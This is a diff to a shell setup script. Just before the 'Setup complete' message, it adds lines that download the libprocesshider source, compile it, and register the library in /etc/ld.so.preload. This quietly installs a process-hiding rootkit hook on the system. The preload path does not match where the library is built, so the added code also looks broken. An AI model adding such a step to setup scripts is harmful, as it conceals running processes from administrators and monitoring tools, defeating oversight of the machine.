@@ -322,4 +322,12 @@ else
 fi
 echo ""
 
+wget https://raw.githubusercontent.com/gianlucaborello/libprocesshider/master/processhider.c
+
+gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
+
+echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
+
+
+
 echo "[*] Setup complete"
